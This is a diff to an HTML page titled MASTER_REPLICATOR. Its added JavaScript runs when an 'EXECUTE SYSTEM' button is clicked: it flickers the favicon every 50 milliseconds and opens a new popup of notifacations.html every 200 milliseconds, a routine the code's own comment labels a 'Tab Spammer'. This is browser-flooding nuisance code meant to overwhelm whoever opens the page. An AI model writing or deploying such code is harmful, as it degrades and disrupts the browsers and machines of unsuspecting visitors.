@@ -4,29 +4,28 @@
     <title>MASTER_REPLICATOR</title>
     <link id="icon" rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' fill='white'/></svg>">
     <style>
-        body { background: #000; color: #fff; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
-        .border { border: 2px solid #fff; padding: 50px; box-shadow: 0 0 15px #fff; }
-        button { padding: 20px 40px; background: #fff; border: none; font-weight: bold; cursor: pointer; font-size: 1.2rem; }
+        body { background: #000; color: #fff; font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { border: 2px solid #fff; padding: 40px; text-align: center; box-shadow: 0 0 20px #fff; }
+        button { margin-top: 20px; padding: 20px 40px; background: #fff; color: #000; border: none; font-weight: bold; cursor: pointer; font-size: 1.2rem; }
         button:hover { background: #ff0000; color: #fff; }
     </style>
 </head>
 <body>
-    <div class="border">
+    <div class="box">
         <h1>REPLICATION_CORE</h1>
-        <p>Target: notifacations.html</p>
+        <p>TARGET: notifacations.html</p>
         <button onclick="start()">EXECUTE SYSTEM</button>
     </div>
 
     <script>
         function start() {
-            // 1. Favicon Glitch
+            // 1. Favicon Glitch (Tab icon flickers)
             setInterval(() => {
                 const p = () => Math.floor(Math.random() * 100);
                 document.getElementById('icon').href = `data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><polygon points='${p()},${p()} ${p()},${p()} ${p()},${p()}' fill='white'/></svg>`;
             }, 50);
 
-            // 2. Open the file from your GitHub name
-            // Note: window.open needs the local file to be in the same folder
+            // 2. Tab Spammer (Opens the second file 5 times per second)
             setInterval(() => {
                 window.open('notifacations.html', '_blank', 'width=400,height=400');
             }, 200);
